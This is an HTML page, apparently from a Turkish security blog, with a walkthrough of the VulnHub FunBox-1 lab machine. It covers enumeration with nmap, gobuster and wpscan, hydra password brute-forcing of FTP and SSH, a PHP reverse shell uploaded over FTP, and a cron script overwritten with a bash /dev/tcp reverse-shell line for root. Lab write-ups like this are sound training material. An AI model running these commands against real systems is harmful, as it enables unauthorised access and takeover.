@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Barcode">
+<meta name="description" content="Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan FunBox-1 adlı makinanın çözümünden bahsedeceğim. Ben çözerken keyif aldım umarım sizde okurken keyif alırsınız&amp;hellip; 😊
+1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
+netdiscover -i eth1  İp adresi tespit edildikten sonra nmap ile makinenin tüm portları taranır. Açık portlarda çalışan servisler tespit edilir." />
+<meta name="keywords" content=", Vulnhub, write-up, sudo, cron, ftp" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://barcode91.github.io/posts/2020/09/vuln-funbox-1-write-up/" />
+
+
+    <title>
+        
+            VULN FunBox-1 Write Up :: Cyber Security Blog  — Welcome the My Blog
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://barcode91.github.io/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+    
+        <link rel="stylesheet" type="text/css" href="https://barcode91.github.io/css/scroll.css">
+    
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://barcode91.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://barcode91.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://barcode91.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://barcode91.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://barcode91.github.io/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://barcode91.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="VULN FunBox-1 Write Up">
+<meta itemprop="description" content="Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/funbox-1,518/) &#39;da yer alan FunBox-1 adlı makinanın çözümünden bahsedeceğim. Ben çözerken keyif aldım umarım sizde okurken keyif alırsınız...">
+<meta itemprop="datePublished" content="2020-09-22T20:59:33+03:00" />
+<meta itemprop="dateModified" content="2020-09-23T00:31:51+03:00" />
+<meta itemprop="wordCount" content="1023">
+<meta itemprop="image" content="https://barcode91.github.io"/>
+
+
+
+<meta itemprop="keywords" content="Vulnhub,write-up,sudo,cron,ftp," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://barcode91.github.io"/>
+
+<meta name="twitter:title" content="VULN FunBox-1 Write Up"/>
+<meta name="twitter:description" content="Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/funbox-1,518/) &#39;da yer alan FunBox-1 adlı makinanın çözümünden bahsedeceğim. Ben çözerken keyif aldım umarım sizde okurken keyif alırsınız..."/>
+
+
+
+
+
+    <meta property="article:section" content="write-up" />
+
+
+
+    <meta property="article:published_time" content="2020-09-22 20:59:33 &#43;0300 &#43;03" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <style>
+
+    span.headwidth{
+     width: 860px;
+    }
+
+
+</style>
+<header class="header">
+    <span class="header__inner headwidth">
+        <a href="https://barcode91.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text"> root@Barcode#</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://barcode91.github.io/categories/cyber-security/">Cyber Security</a></li><li><a href="https://barcode91.github.io/categories/network/">Network</a></li><li><a href="https://barcode91.github.io/categories/write-up/">Write-up</a></li><li><a href="https://barcode91.github.io/about/">About</a></li><li><a href="https://barcode91.github.io/categories/">Categories</a></li><li><a href="https://barcode91.github.io/tags/">Tags</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+<style>
+  .center.cover {
+    border-radius: 10px;
+    margin: auto;
+
+    
+  }
+
+  .post-content p {
+    text-align: justify;
+  }
+</style>
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        5 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://barcode91.github.io/posts/2020/09/vuln-funbox-1-write-up/">VULN FunBox-1 Write Up</a>
+      </h1>
+
+      
+        <img src="https://barcode91.github.io/images/vulnhub/funbox1/cover.png" class="center cover" />
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-keşif-aşaması">1. Keşif Aşaması</a></li>
+    <li><a href="#2-erişim-sağlanması">2. Erişim Sağlanması</a></li>
+    <li><a href="#3-yetki-yükseltme">3. Yetki Yükseltme</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        
+        <p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/funbox-1,518/">VULNHUB</a> &lsquo;da yer alan FunBox-1 adlı makinanın çözümünden bahsedeceğim. Ben çözerken keyif aldım umarım sizde okurken keyif alırsınız&hellip; 😊</p>
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
+</code></pre></div>
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/discover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>İp adresi tespit edildikten sonra nmap ile makinenin tüm portları taranır. Açık portlarda çalışan servisler tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.106
+</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 07:04 CDT
+Nmap scan report for 192.168.56.106 (192.168.56.106)
+Host is up (0.00010s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     ProFTPD
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/secret/
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://funbox.fritz.box/
+|_https-redirect: ERROR: Script execution failed (use -d to debug)
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message&quot;
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version,
+....
+MAC Address: 08:00:27:45:D6:F8 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.87 seconds
+</code></pre>
+
+<div style="text-align:justify;">
+<br>
+Nmap taramasından görüldüğü gibi site funbox.fritz.box adresine yönlendirilmektedir. İlk olarak /etc/hosts dosyasına <i style="color:yellow;">192.168.56.106  funbox.fritz.box </i>bilgisi eklenir. Daha sonra tarayıcıdan funbox.fritz.box istek atılır. Açılan sayfada footer bölümüne bakıldığında sitenin Wordpress CMS uygulaması olduğu görülmektedir.
+<br>
+<br>
+</div>
+
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/website.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/footer.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Nmap taramasında tespit edilen robots.txt dosyasına girilen /secret dizinine gidilir. Dizin içerisinde bir mesaj bırakılmıştır. 😐</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/secret.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Gobuster aracı ile web dizin taraması yapılır. Dizin ve alt dizin taramaları sonucunda işe yarar bir bilgi edinilememiştir. 😕</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://funbox.fritz.box/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+</code></pre></div>
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/gobuster.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Wordpress&rsquo;e özel araç olan <strong>wpscan</strong> ile tarama gerçeleştirilir. Admin paneli, kullanıcı adları ve parola bilgileri elde edinilmeye çalışılır. Tarama sonucunda <em>admin</em> ve <em>joe</em> adında iki kullanıcı adı tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wpscan --url http://funbox.fritz.box/ --enumerate
+</code></pre></div>
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/wpscan.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Elde edinilen kullanıcı adları ile ssh ve ftp servislerine hydra aracı ile brute force saldırısı yapılır. Her iki serviste de saldırı sonucunda <strong>joe</strong> kullanıcısına ait parola bilgisi elde edilir. Bu aşamadan sonra ftp portundan devam edilmektedir. (Ssh servisine saldırmak sonradan aklıma geldi 🥺) Ssh bağlantısı alınarak da devam edilebilmektedir.</p>
+<pre><code class="language-terminal" data-lang="terminal">hydra -l joe -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.106
+</code></pre>
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/ftp.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<pre><code class="language-terminal" data-lang="terminal">hydra -l joe -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.106
+</code></pre>
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/ssh.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<p>Ftp servisine bağlanılır. Shell almak için web uygulamasının yer aldığı <em><strong>/var/www/html</strong></em> dizini geçilir, reverse shell almak için <strong>joe</strong> kullanıcısı yetkilerinde olan secret klasörüne dosya yüklenir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ftp 192.168.56.106
+</code></pre></div><pre><code class="language-terminal" data-lang="terminal">Connected to 192.168.56.106.
+220 ProFTPD Server (Debian) [::ffff:192.168.56.106]
+Name (192.168.56.106:barcode): joe
+331 Password required for joe
+Password:
+230 User joe logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; cd /var/www/html
+250 CWD command successful
+ftp&gt; ls -lsa
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxrwxrwx   6 www-data www-data     4096 Jul 18 10:12 .
+drwxr-xr-x   4 root     root         4096 Jun 19 11:18 ..
+-rwxrwxrwx   1 www-data www-data    10918 Jun 19 11:16 default.htm
+-rwxrwxrwx   1 www-data www-data      405 Jul 17 16:02 index.php
+-rwxrwxrwx   1 www-data www-data    19915 Jul 17 16:02 license.txt
+-rwxrwxrwx   1 www-data www-data     7278 Jul 17 16:02 readme.html
+-rw-rw-r--   1 joe      joe            19 Jul 18 10:12 robots.txt
+drwxrwxr-x   2 joe      joe          4096 Jul 18 10:05 secret
+-rwxrwxrwx   1 www-data www-data     6912 Jul 17 16:02 wp-activate.php
+drwxrwxrwx   9 www-data www-data     4096 Jul 17 16:02 wp-admin
+-rwxrwxrwx   1 www-data www-data      351 Jul 17 16:02 wp-blog-header.php
+-rwxrwxrwx   1 www-data www-data     2332 Jul 17 16:02 wp-comments-post.php
+-rwxrwxrwx   1 www-data www-data     3047 Jun 19 11:28 wp-config.php
+-rwxrwxrwx   1 www-data www-data     2913 Jul 17 16:02 wp-config-sample.php
+drwxrwxrwx   6 www-data www-data     4096 Jul 18 08:44 wp-content
+-rwxrwxrwx   1 www-data www-data     3940 Jul 17 16:02 wp-cron.php
+drwxrwxrwx  21 www-data www-data    12288 Jul 17 16:02 wp-includes
+-rwxrwxrwx   1 www-data www-data     2496 Jul 17 16:02 wp-links-opml.php
+-rwxrwxrwx   1 www-data www-data     3300 Jul 17 16:02 wp-load.php
+-rwxrwxrwx   1 www-data www-data    47874 Jul 17 16:02 wp-login.php
+-rwxrwxrwx   1 www-data www-data     8509 Jul 17 16:02 wp-mail.php
+-rwxrwxrwx   1 www-data www-data    19396 Jul 17 16:02 wp-settings.php
+-rwxrwxrwx   1 www-data www-data    31111 Jul 17 16:02 wp-signup.php
+-rwxrwxrwx   1 www-data www-data     4755 Jul 17 16:02 wp-trackback.php
+-rwxrwxrwx   1 www-data www-data     3133 Jul 17 16:02 xmlrpc.php
+226 Transfer complete
+ftp&gt; cd secret
+250 CWD command successful
+ftp&gt; put reverse.php
+local: reverse.php remote: reverse.php
+200 PORT command successful
+150 Opening BINARY mode data connection for reverse.php
+226 Transfer complete
+3475 bytes sent in 0.00 secs (11.3494 MB/s)
+ftp&gt; ls -lsa
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxrwxr-x   2 joe      joe          4096 Sep 22 13:59 .
+drwxrwxrwx   6 www-data www-data     4096 Jul 18 10:12 ..
+-rw-rw-r--   1 joe      joe            30 Jul 18 10:05 index.html
+-rw-r--r--   1 joe      joe          3475 Sep -22 13:59 reverse.php
+226 Transfer complete
+</code></pre><p>Netcat ile 4444 numaralı port dinlenmeye başlanır ve tarayıcından <a href="http://funbox.fritz.box/secret/reverse.php">http://funbox.fritz.box/secret/reverse.php</a> istek atılırak terminal bağlantısı sağlanır.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/firstac.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>www-data kullanısından <code>su joe </code> komutu ve ftp servisinde kullanılan parola bilgisi kullanılarak joe kullanıcısına yetki yükseltilir.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/firstpriv.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p>Home dizinine geçilerek diğer kullanıcılara bakıldığında <strong>funny</strong> kullanısına ait klasör görülmektedir. Klasör joe kullanıcısını erişime açıktır. Klasör içeriği listelenir.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/funnyhome.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Dizinde yer alan sh uzantılı dosyalar görüntülenir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat .backup.sh 
+<span style="color:#75715e">#!/bin/bash</span>
+tar -cf /home/funny/html.tar /var/www/html
+
+cat .reminder.sh 
+<span style="color:#75715e">#!/bin/bash</span>
+echo <span style="color:#e6db74">&#34;Hi Joe, the hidden backup.sh backups the entire webspace on and on. Ted, the new admin, test it in a long run.&#34;</span> | mail -s<span style="color:#e6db74">&#34;Reminder&#34;</span> joe@funbox
+</code></pre></div><p><strong>.backup.sh</strong> dosyası web dizininde yer alan dosyaların yedeklerini almaktadır. Sistem hakkında daha fazla bilgi toplamak için <a href="https://github.com/rebootuser/LinEnum">LinEnum Betiği</a> kullanılır. Sonuçlar incelendiğinde .backup.sh dosyasının funny kullanıcısının cron görevi olduğu görülmektedir.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/cron.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Ayrıca funny kullanıcısının yüksek yetkili kullanıcı olduğu tespit edilmektedir.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/yetki.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Sistemde çalışan cron servisinin hangi kullanıcı yetkisinde çalıştığı incelenir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ps aux | grep cron
+</code></pre></div>
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/ps.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Cron uygulaması root yetkisinde çalışmaktadır. .backup.sh dosyası içeriğinde yer alan komutlar funny kullanıcısının ile çalışacaktır. Funny kullanıcısı sudo yetkisine sahiptir. Bu nedenle komutlar sudo ile verildiğinde root  yetkisinde çalışmaktadır. Dosya aşağıdaki gibi düzenlenir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;sudo bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.56.105/7776 &lt;&amp;1&#39;&#34;</span> &gt; .backup.sh
+</code></pre></div><p>nc ile 7776 numaralı port dinlenir ve kısa bir süre otomatik bağlantı gerçekleşmektedir. Root dizini altındaki flag değerine ulaşılarak çözümleme tamamlanır.</p>
+<p>
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/root.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+
+
+<div style="text-align:justify;">Yetki yükseltme aşaması biraz zaman alsa da çözülmeye değer bir makinaydı. 🤗
+</div>
+
+    <img src="https://barcode91.github.io/images/vulnhub/funbox1/finally.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+</p>
+
+       
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon">
+            <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
+            <line x1="7" y1="7" x2="7" y2="7"></line>
+          </svg><span class="tag"><a href="https://barcode91.github.io/tags/vulnhub/">Vulnhub</a></span><span class="tag"><a href="https://barcode91.github.io/tags/write-up/">write-up</a></span><span class="tag"><a href="https://barcode91.github.io/tags/sudo/">sudo</a></span><span class="tag"><a href="https://barcode91.github.io/tags/cron/">cron</a></span><span class="tag"><a href="https://barcode91.github.io/tags/ftp/">ftp</a></span>
+        </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1023 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        2020-09-22 20:59 &#43;0300
+      </p>
+
+      
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-funbox-1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-funbox-1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=VULN%20FunBox-1%20Write%20Up&amp;caption=VULN%20FunBox-1%20Write%20Up&amp;canonicalUrl=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-funbox-1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=VULN%20FunBox-1%20Write%20Up&amp;body=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-funbox-1-write-up%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-funbox-1-write-up%2f&amp;media=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-funbox-1-write-up%2f;description=VULN%20FunBox-1%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-funbox-1-write-up%2f&amp;title=VULN%20FunBox-1%20Write%20Up&amp;summary=VULN%20FunBox-1%20Write%20Up&amp;source=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-funbox-1-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fbarcode91.github.io%2fposts%2f2020%2f09%2fvuln-funbox-1-write-up%2f&amp;resubmit=true&amp;title=VULN%20FunBox-1%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
